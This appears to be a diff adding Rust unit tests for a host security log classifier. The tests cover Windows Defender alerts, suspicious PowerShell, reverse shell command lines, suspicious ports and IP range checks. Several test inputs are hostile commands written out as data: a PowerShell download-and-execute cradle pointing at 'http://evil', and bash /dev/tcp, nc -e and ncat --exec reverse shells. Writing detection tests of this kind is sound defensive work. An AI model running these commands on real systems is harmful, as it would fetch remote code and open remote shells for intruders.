+    #[test]
+    fn classifies_windows_defender_signals() {
+        assert_eq!(
+            classify(
+                "EventID=1116\tTime=2026-01-01T00:00:00.000Z\tWindows Defender has detected malware."
+            ),
+            Some(("high", "Windows Defender detected malware"))
+        );
+        assert_eq!(
+            classify(
+                "EventID=5001\tTime=2026-01-01T00:00:00.000Z\tReal-time protection was disabled."
+            ),
+            Some(("high", "Windows Defender real-time protection disabled"))
+        );
+    }
+
+    #[test]
+    fn powershell_script_block_logging_reuses_existing_lolbin_rules() {
+        // Event 4104 lines carry no dedicated RULES entry of their own --
+        // they reuse whichever LOLBin/obfuscation pattern already exists
+        // for 4688, since the underlying signal (a suspicious command/
+        // script) is the same regardless of which log emitted it.
+        assert_eq!(
+            classify(
+                "EventID=4104\tTime=2026-01-01T00:00:00.000Z\tCreating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://evil') -EncodedCommand"
+            ),
+            Some(("high", "Suspicious encoded PowerShell command"))
+        );
+    }
+
+    #[test]
+    fn classifies_reverse_shell_process_command_lines() {
+        assert_eq!(
+            classify("bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            Some(("high", "Possible reverse shell (bash /dev/tcp construct)"))
+        );
+        assert_eq!(
+            classify("nc -e /bin/sh 10.0.0.1 4444"),
+            Some(("high", "Possible reverse shell (netcat -e)"))
+        );
+        assert_eq!(
+            classify("ncat --exec /bin/sh 10.0.0.1 4444"),
+            Some(("high", "Possible reverse shell (ncat --exec)"))
+        );
+    }
+
+    #[test]
+    fn ordinary_process_command_lines_do_not_classify() {
+        assert_eq!(classify("/usr/sbin/sshd -D"), None);
+        assert_eq!(classify("nginx: worker process"), None);
+        assert_eq!(classify("/usr/bin/python3 /opt/app/server.py"), None);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn parses_listening_port_from_ss_style_line() {
+        assert_eq!(
+            parse_listening_port("LISTEN 0      128        0.0.0.0:22           0.0.0.0:*", 3),
+            Some("22")
+        );
+        assert_eq!(
+            parse_listening_port(
+                "LISTEN 0      4096          [::]:443              [::]:*",
+                3
+            ),
+            Some("443")
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn parses_listening_port_from_netstat_style_line() {
+        assert_eq!(
+            parse_listening_port(
+                "tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN",
+                3
+            ),
+            Some("8080")
+        );
+    }
+
+    #[test]
+    fn classifies_known_reverse_shell_ports() {
+        for port in ["4444", "1337", "31337", "6666", "6667"] {
+            assert_eq!(
+                classify(&format!(
+                    "remote_port={port}\tremote_addr=203.0.113.9\tproto=tcp"
+                )),
+                Some((
+                    "high",
+                    "Outbound connection to a well-known reverse-shell port"
+                )),
+                "port {port} should classify"
+            );
+        }
+    }
+
+    #[test]
+    fn does_not_classify_a_similar_but_different_port() {
+        // Regression check: "remote_port=16667" must not match the
+        // "remote_port=6667" needle just because it contains "6667" as a
+        // substring -- the `remote_port=` prefix has to line up exactly.
+        assert_eq!(
+            classify("remote_port=16667\tremote_addr=203.0.113.9\tproto=tcp"),
+            None
+        );
+        assert_eq!(
+            classify("remote_port=443\tremote_addr=203.0.113.9\tproto=tcp"),
+            None
+        );
+    }
+
+    #[test]
+    fn is_private_or_loopback_recognizes_common_internal_ranges() {
+        for ip in [
+            "10.0.0.5",
+            "172.16.0.5",
+            "192.168.1.5",
+            "127.0.0.1",
+            "169.254.1.1",
+            "::1",
+            "fc00::1",
+            "fe80::1",
+        ] {
+            assert!(
+                is_private_or_loopback(&ip.parse().unwrap()),
+                "{ip} should be treated as private/loopback"
+            );
+        }
+    }
+
+    #[test]
+    fn is_private_or_loopback_does_not_flag_public_addresses() {
+        for ip in ["203.0.113.9", "8.8.8.8", "2001:db8::1"] {
+            assert!(
+                !is_private_or_loopback(&ip.parse().unwrap()),
+                "{ip} should be treated as public"
+            );
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn parses_remote_addr_port_from_ss_established_line() {
+        assert_eq!(
+            parse_remote_addr_port("ESTAB 0 0 192.168.1.5:52341 203.0.113.9:4444", 4),
+            Some(("203.0.113.9".parse().unwrap(), 4444))
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn parses_remote_addr_port_handles_bracketed_ipv6() {
+        assert_eq!(
+            parse_remote_addr_port("ESTAB 0 0 [::1]:52341 [2001:db8::1]:4444", 4),
+            Some(("2001:db8::1".parse().unwrap(), 4444))
         );
     }
 }
